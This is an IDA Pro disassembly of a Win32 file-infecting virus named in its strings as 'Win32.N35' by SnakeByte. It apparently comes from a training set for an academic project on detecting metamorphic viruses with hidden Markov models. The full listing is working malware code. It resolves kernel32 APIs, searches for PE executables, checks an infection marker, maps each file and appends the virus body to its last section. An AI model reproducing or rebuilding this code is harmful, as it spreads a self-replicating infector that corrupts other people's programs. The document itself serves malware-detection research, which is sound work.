

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N35.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00018000 (  98304.)
; Section size in file		: 00018000 (  98304.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

		public start
start:
		nop
		nop
		nop

		nop
		nop
		nop

loc_418638:				; DATA XREF: sub_418B96+12Br
		call	$+5

loc_41863D:				; DATA XREF: CODE:00418646o
		mov	ebx, [esp]
		dec	esp
		add	esp, 5
		mov	ebp, ebx
		sub	ebp, offset loc_41863D
		jmp	loc_4186D1

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418651	proc near		; CODE XREF: CODE:00418A79p
		cmp	ss:dword_4188DF[ebp], 0
		jnz	short locret_4186D0
		call	sub_418AD9
		jb	short locret_4186D0
		mov	eax, 9F1Ah
		sub	eax, 9F1Ah
		add	eax, ss:dword_4187C0[ebp]
		cmp	word ptr [eax],	5A4Dh
		jz	short loc_418685
		mov	ecx, 0BFF8h
		sub	ecx, 0BFF8h
		jz	short loc_4186CB

loc_418685:				; CODE XREF: sub_418651+25j
		cmp	word ptr [eax+3Ch], 0
		jz	short loc_4186CB
		mov	esi, 1831h
		sub	esi, 1831h
		add	esi, [eax+3Ch]
		cmp	ss:dword_4188E3[ebp], esi
		jb	short loc_4186CB
		add	esi, eax
		cmp	word ptr [esi],	4550h
		jz	short loc_4186AD
		jmp	short loc_4186CB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4186AD:				; CODE XREF: sub_418651+58j
		cmp	dword ptr [esi+4Ch], 4E3335h
		jz	short loc_4186CB
		mov	bx, [esi+16h]
		and	bx, 2
		cmp	bx, 2
		jnz	short loc_4186CB
		call	sub_418B96
		jb	short locret_4186D0

loc_4186CB:				; CODE XREF: sub_418651+32j
					; sub_418651+39j ...
		call	sub_418B67

locret_4186D0:				; CODE XREF: sub_418651+7j
					; sub_418651+Ej ...
		retn
sub_418651	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4186D1:				; CODE XREF: CODE:0041864Cj
		push	ss:dword_4187CC[ebp]
		pop	ss:dword_418ABD[ebp]
		push	ss:dword_4187BC[ebp]
		pop	ss:dword_418AC2[ebp]
		pop	edx
		inc	esp
		sub	esp, 5
		ror	edx, 10h
		shl	edx, 10h
		mov	ss:dword_418A09[ebp], 4

loc_4186FE:				; CODE XREF: CODE:0041872Fj
		mov	ebx, ss:dword_418A09[ebp]
		xor	eax, eax
		cmp	ebx, 0
		jnz	short loc_418710
		jmp	loc_418AA0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418710:				; CODE XREF: CODE:00418709j
		movzx	ecx, word ptr [edx]
		xor	ecx, 5A4Dh
		jz	short loc_418731

loc_41871B:				; CODE XREF: CODE:00418746j
					; CODE:0041875Ej
		mov	ebx, 0
		add	ebx, 10000h
		sub	edx, ebx
		sub	ss:dword_418A09[ebp], 1
		jmp	short loc_4186FE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418731:				; CODE XREF: CODE:00418719j
		add	edx, 3Ch
		mov	ebx, [edx]
		sub	edx, 3Ch
		neg	edx
		sub	ebx, edx
		neg	edx
		cmp	word ptr [ebx],	4550h
		jz	short loc_418748
		jmp	short loc_41871B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418748:				; CODE XREF: CODE:00418744j
		dec	ebx
		add	ebx, 17h
		mov	eax, 0
		movzx	eax, word ptr [ebx]
		and	ax, 0F000h
		cmp	ax, 2000h
		jz	short loc_418760
		jmp	short loc_41871B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418760:				; CODE XREF: CODE:0041875Cj
		inc	ebx
		sub	ebx, 17h
		mov	ss:dword_4187C4[ebp], ebx
		mov	ss:dword_4188B7[ebp], edx
		lea	edx, dword_418778[ebp]
		push	edx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_418778	dd 8B9h			; DATA XREF: CODE:00418770r
		db 0, 8Dh, 95h
		dd offset dword_4187E0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		lea	edi, dword_41880A[ebp]

loc_418789:				; CODE XREF: CODE:004187A8j
		and	ebx, 0
		mov	bl, [edi]
		inc	edi
		call	sub_418D32
		push	edi
		add	[esp], ebx
		pop	edi
		mov	eax, ss:dword_4187B2[ebp]
		mov	[edx], eax
		dec	edx
		add	edx, 5
		sub	ecx, 1
		jnz	short loc_418789
		lea	edx, dword_418A63[ebp]
		push	edx
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4187B2	dd 0			; DATA XREF: CODE:00418799r
					; sub_418D32+DBw ...
dword_4187B6	dd 0			; DATA XREF: sub_418B96+B9w
word_4187BA	dw 0			; DATA XREF: sub_418D32+1w
					; sub_418D32+9Aw ...
dword_4187BC	dd 0			; DATA XREF: CODE:004186DDr
					; CODE:00418AA0r ...
dword_4187C0	dd 0			; DATA XREF: sub_418651+1Ar
					; sub_418B0F+50w ...
dword_4187C4	dd 0			; DATA XREF: CODE:00418764w
					; sub_418D32+9r
dword_4187C8	dd 0			; DATA XREF: sub_418D32+2Aw
					; sub_418D32+CDr
dword_4187CC	dd 0			; DATA XREF: CODE:004186D1r
					; CODE:00418AACr ...
dword_4187D0	dd 0			; DATA XREF: sub_418D32+3Bw
					; sub_418D32+4Fr
dword_4187D4	dd 0			; DATA XREF: sub_418B96+103w
dword_4187D8	dd 0			; DATA XREF: sub_418B0F+2Bw
					; sub_418B0F+40r ...
dword_4187DC	dd 0			; DATA XREF: sub_418D32+49w
					; sub_418D32+BBr
dword_4187E0	dd 0			; DATA XREF: CODE:0041877Fo
					; sub_418A41+1Br
dword_4187E4	dd 0			; DATA XREF: sub_418AD9+20r
dword_4187E8	dd 0			; DATA XREF: sub_418B0F+46r
dword_4187EC	dd 0			; DATA XREF: sub_418B0F+24r
dword_4187F0	dd 0			; DATA XREF: sub_418A0D+Fr
dword_4187F4	dd 0			; DATA XREF: sub_418B7D+6r
dword_4187F8	dd 0			; DATA XREF: CODE:00418A98r
dword_4187FC	dd 0			; DATA XREF: sub_418B67+Er
					; sub_418B7D+12r
dword_418800	dd 0, 58652E2Ah		; DATA XREF: sub_418A0D+15w
					; sub_418A41+14r ...
		db 45h,	0
dword_41880A	dd 6E69460Dh		; DATA XREF: CODE:00418783r
		dd 78654E64h, 6C694674h, 430B4165h, 74616572h, 6C694665h
		dd 4D0D4165h, 69567061h, 664F7765h, 656C6946h, 65724312h
		dd 46657461h, 4D656C69h, 69707061h, 0E41676Eh, 646E6946h
		dd 73726946h, 6C694674h, 550F4165h, 70616D6Eh, 77656956h
		dd 6946664Fh, 4609656Ch, 43646E69h, 65736F6Ch, 6F6C430Bh
		dd 61486573h, 656C646Eh
dword_41887A	dd 0			; DATA XREF: sub_418AD9+2Fr
					; sub_418B0F+18r ...
dword_41887E	dd 0			; DATA XREF: sub_418D32+65w
					; sub_418D32+90r
dword_418882	dd 0			; DATA XREF: sub_418CF6+18w
					; sub_418CF6+22r
aVirusWin32_n35	db 'Virus : Win32.N35 Author : SnakeByte',0
dword_4188AB	dd 0			; DATA XREF: sub_418B96+22w
					; sub_418B96+2Dr ...
dword_4188AF	dd 0			; DATA XREF: CODE:00418A67o
					; CODE:00418A7Er ...
dword_4188B3	dd 0			; DATA XREF: sub_418B96+33w
					; sub_418B96+3Dw
dword_4188B7	dd 0			; DATA XREF: CODE:0041876Aw
					; sub_418D32+15r ...
dword_4188BB	dd 0			; DATA XREF: sub_418B96+1Cw
					; sub_418B96+D6w ...
dword_4188BF	dd 0			; DATA XREF: sub_418D32+6Cw
					; sub_418D32+89r
dword_4188C3	dd 7 dup(0)		; DATA XREF: sub_418A0D+7o
					; sub_418A41+Br
dword_4188DF	dd 0			; DATA XREF: sub_418651r
dword_4188E3	dd 0			; DATA XREF: sub_418651+49r
					; sub_418B0Fr ...
		dd 2 dup(0)
dword_4188EF	dd 46h dup(0)		; DATA XREF: sub_418A29+1r
					; sub_418AD9+17o
		db 2 dup(0)
dword_418A09	dd 0			; DATA XREF: CODE:004186F4w
					; CODE:004186FEr ...

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418A0D	proc near		; CODE XREF: CODE:00418A71p
		call	sub_418A29
		mov	edx, ebp
		add	edx, offset dword_4188C3
		push	edx
		push	esi
		call	ss:dword_4187F0[ebp]
		mov	ss:dword_418800[ebp], eax
		retn
sub_418A0D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418A29	proc near		; CODE XREF: sub_418A0Dp sub_418A41p
		pusha
		lea	ecx, dword_4188EF[ebp]
		mov	eax, 113h
		xor	eax, 7

loc_418A38:				; CODE XREF: sub_418A29+14j
		mov	byte ptr [ecx],	0
		inc	ecx
		dec	eax
		jnz	short loc_418A38
		popa
		retn
sub_418A29	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418A41	proc near		; CODE XREF: CODE:00418A87p
		call	sub_418A29
		sub	ecx, 153E61Dh
		lea	edi, dword_4188C3[ebp]
		push	edi
		xor	edx, edx
		add	edx, ss:dword_418800[ebp]
		push	edx
		call	ss:dword_4187E0[ebp]
		retn
sub_418A41	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_418A63	dd 858F146Ah		; DATA XREF: CODE:004187AAr
		dd offset dword_4188AF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		lea	esi, (dword_418800+4)[ebp]
		call	sub_418A0D
		inc	eax
		jz	short loc_418A90

loc_418A79:				; CODE XREF: CODE:00418A8Ej
		call	sub_418651
		cmp	ss:dword_4188AF[ebp], 0
		jbe	short loc_418A90
		call	sub_418A41
		test	eax, eax
		jnz	short loc_418A79

loc_418A90:				; CODE XREF: CODE:00418A77j
					; CODE:00418A85j
		push	ss:dword_418800[ebp]
		sub	edx, eax
		call	ss:dword_4187F8[ebp]
		jmp	short loc_418AB8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418AA0:				; CODE XREF: CODE:0041870Bj
		push	ss:dword_4187BC[ebp]
		pop	ss:dword_418AC2[ebp]
		push	ss:dword_4187CC[ebp]
		pop	ss:dword_418ABD[ebp]

loc_418AB8:				; CODE XREF: CODE:00418A9Ej
					; sub_418D32+EFj
		or	ebp, ebp
		jz	short loc_418AC8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 0B8h	; ¸
dword_418ABD	dd 0			; DATA XREF: CODE:004186D7w
					; CODE:00418AB2w
		db 5
dword_418AC2	dd 0			; DATA XREF: CODE:004186E3w
					; CODE:00418AA6w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		push	eax
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418AC8:				; CODE XREF: CODE:00418ABAj
		mov	edx, 80D4h
		sub	edx, 80D4h
		push	edx
		call	ExitProcess

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418AD9	proc near		; CODE XREF: sub_418651+9p
		mov	ebx, 7DDAh
		sub	ebx, 7DDAh
		push	ebx
		push	ebx
		push	3
		push	ebx
		inc	ebx
		push	ebx
		push	0C0000000h
		mov	eax, offset dword_4188EF
		add	eax, ebp
		inc	ebx
		push	eax
		call	ss:dword_4187E4[ebp]
		add	eax, 1
		jz	short loc_418B7B
		inc	ebx
		sub	eax, 1
		lea	edi, dword_41887A[ebp]
		stosd
sub_418AD9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418B0F	proc near		; CODE XREF: sub_418B96+50p
		mov	ecx, ss:dword_4188E3[ebp]
		push	ecx
		push	0
		push	ecx
		push	0
		mov	ebx, 24h
		xor	ebx, 20h
		push	ebx
		push	0
		dec	edx
		push	ss:dword_41887A[ebp]
		or	ebx, 28CE78Fh
		call	ss:dword_4187EC[ebp]
		push	eax
		pop	ss:dword_4187D8[ebp]
		pop	ecx
		test	eax, eax
		jz	short loc_418B6F
		and	eax, 0
		push	ecx
		push	eax
		push	eax
		push	2
		pop	ebx
		push	ebx
		push	ss:dword_4187D8[ebp]
		call	ss:dword_4187E8[ebp]
		or	eax, eax
		jz	short sub_418B67
		mov	ss:dword_4187C0[ebp], eax
		clc
		retn
sub_418B0F	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418B67	proc near		; CODE XREF: sub_418651+7Ap
					; sub_418B0F+4Ej
		call	sub_418B7D
		shl	edx, 1Eh

loc_418B6F:				; CODE XREF: sub_418B0F+34j
		push	ss:dword_41887A[ebp]
		call	ss:dword_4187FC[ebp]

loc_418B7B:				; CODE XREF: sub_418AD9+29j
		stc
		retn
sub_418B67	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418B7D	proc near		; CODE XREF: sub_418B67p
					; sub_418B96+44p
		push	ss:dword_4187C0[ebp]
		call	ss:dword_4187F4[ebp]
		push	ss:dword_4187D8[ebp]
		call	ss:dword_4187FC[ebp]
		retn
sub_418B7D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418B96	proc near		; CODE XREF: sub_418651+73p
		push	ss:dword_4187C0[ebp]
		pop	esi
		mov	ebx, esi
		add	ebx, [esi+3Ch]
		mov	eax, [ebx+3Ch]
		push	ss:dword_4188E3[ebp]
		pop	ecx
		add	ecx, 7EEh
		mov	ss:dword_4188BB[ebp], eax
		mov	ss:dword_4188AB[ebp], ecx
		call	sub_418CF6
		mov	ecx, ss:dword_4188AB[ebp]
		mov	ss:dword_4188B3[ebp], 0
		add	ss:dword_4188B3[ebp], ecx
		pusha
		call	sub_418B7D
		popa
		mov	ss:dword_4188E3[ebp], ecx
		call	sub_418B0F
		jb	loc_418CF4
		push	ss:dword_4187C0[ebp]
		pop	esi
		mov	ebx, esi
		add	ebx, [esi+3Ch]
		and	esi, 0
		add	esi, ebx
		push	0
		pop	edx
		mov	dx, [esi+6]
		inc	edx
		sub	edx, 2
		imul	edx, 28h
		inc	ebx
		add	ebx, 77h
		add	ebx, edx
		mov	ecx, 0
		add	ecx, [esi+74h]
		clc
		rcl	ecx, 3
		add	ebx, ecx
		shl	eax, 2
		mov	ecx, [esi+28h]
		mov	ss:dword_4187CC[ebp], ecx
		mov	ecx, [esi+34h]
		mov	ss:dword_4187BC[ebp], ecx
		mov	ecx, [ebx+10h]
		push	ecx
		pop	edx
		add	ecx, [ebx+14h]
		push	ecx
		mov	eax, edx
		add	ebx, 0Ch
		add	eax, [ebx]
		sub	ebx, 0Ch
		mov	[esi+28h], eax
		mov	ss:dword_4187B6[ebp], eax
		mov	eax, 0
		add	eax, [ebx+10h]
		push	eax
		add	eax, 7EEh
		mov	ss:dword_4188AB[ebp], eax
		push	dword ptr [esi+3Ch]
		pop	ss:dword_4188BB[ebp]
		call	sub_418CF6
		mov	eax, ss:dword_4188AB[ebp]
		mov	dword ptr [ebx+10h], 0
		add	[ebx+10h], eax
		pop	eax
		add	eax, 406h
		add	eax, 3E8h
		mov	dword ptr [ebx+8], 0
		sub	ss:dword_4187D4[ebp], ecx
		add	[ebx+8], eax
		mov	eax, [ebx+10h]
		add	eax, [ebx+0Ch]
		mov	dword ptr [esi+50h], 0
		add	[esi+50h], eax
		or	dword ptr [ebx+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 4E3335h
		pop	edi
		lea	esi, loc_418638[ebp]
		or	eax, 0AA5D5Bh
		add	edi, ss:dword_4187C0[ebp]
		mov	ecx, 7EEh
		rep movsb
		push	0
		pop	ebx
		add	ebx, ss:dword_4188AF[ebp]
		mov	eax, 0Dh
		xor	eax, 0Ch
		sub	ebx, eax
		mov	ss:dword_4188AF[ebp], ebx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418CF4:				; CODE XREF: sub_418B96+55j
		stc
		retn
sub_418B96	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418CF6	proc near		; CODE XREF: sub_418B96+28p
					; sub_418B96+DCp
		pusha
		mov	edx, 0FFFFD471h
		add	edx, 2B8Fh
		mov	eax, ss:dword_4188AB[ebp]
		mov	ebx, ss:dword_4188BB[ebp]
		mov	ss:dword_418882[ebp], eax
		div	ebx
		sub	ebx, edx
		mov	eax, ss:dword_418882[ebp]
		add	eax, ebx
		mov	ss:dword_4188AB[ebp], 0
		add	ss:dword_4188AB[ebp], eax
		popa
		retn
sub_418CF6	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_418D32	proc near		; CODE XREF: CODE:0041878Fp
		pusha
		and	ss:word_4187BA[ebp], 0
		mov	edx, ss:dword_4187C4[ebp]
		push	0
		pop	ecx
		add	ecx, [edx+78h]
		add	ecx, ss:dword_4188B7[ebp]
		add	ecx, 1Ch
		mov	edx, [ecx]
		inc	ecx
		add	ecx, 3
		add	edx, ss:dword_4188B7[ebp]
		mov	ss:dword_4187C8[ebp], edx
		mov	edx, [ecx]
		add	ecx, 4
		add	edx, ss:dword_4188B7[ebp]
		mov	ss:dword_4187D0[ebp], edx
		mov	edx, [ecx]
		add	edx, ss:dword_4188B7[ebp]
		mov	ss:dword_4187DC[ebp], edx
		mov	eax, ss:dword_4187D0[ebp]

loc_418D87:				; CODE XREF: sub_418D32+ACj
		push	eax
		mov	edx, [eax]
		add	edx, ss:dword_4188B7[ebp]
		mov	eax, edx
		push	0
		pop	esi
		add	esi, edx
		mov	ss:dword_41887E[ebp], ebx
		push	esi
		mov	ss:dword_4188BF[ebp], edi
		cld

loc_418DA5:				; CODE XREF: sub_418D32+87j
		mov	cl, [edi]
		cmp	cl, [esi]
		jnz	short loc_418DBB
		push	1
		pop	edx
		sub	ebx, edx
		cmp	ebx, 0
		jz	short loc_418DE0
		sub	esi, 0FFFFFFFFh
		inc	edi
		jmp	short loc_418DA5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418DBB:				; CODE XREF: sub_418D32+77j
		mov	edi, ss:dword_4188BF[ebp]
		pop	esi
		mov	ebx, ss:dword_41887E[ebp]
		pop	eax
		add	eax, 4
		inc	ss:word_4187BA[ebp]
		cmp	ss:word_4187BA[ebp], 2005h
		jz	short loc_418E1F
		jmp	short loc_418D87
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418DE0:				; CODE XREF: sub_418D32+81j
		pop	eax
		pop	esi
		sub	eax, eax
		mov	ax, ss:word_4187BA[ebp]
		shl	eax, 1
		add	eax, ss:dword_4187DC[ebp]
		push	eax
		pop	ecx
		or	edx, eax
		sub	eax, eax
		mov	ax, [ecx]
		shl	eax, 2
		add	eax, ss:dword_4187C8[ebp]
		mov	edx, ss:dword_4188B7[ebp]
		add	edx, [eax]
		mov	ss:dword_4187B2[ebp], 0
		add	ss:dword_4187B2[ebp], edx
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_418E1F:				; CODE XREF: sub_418D32+AAj
		pop	edx
		popa
		jmp	loc_418AB8
sub_418D32	endp

; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 200h
CODE		ends

; Section 2. (virtual address 00019000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00018600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 419000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 0001A000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00018600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
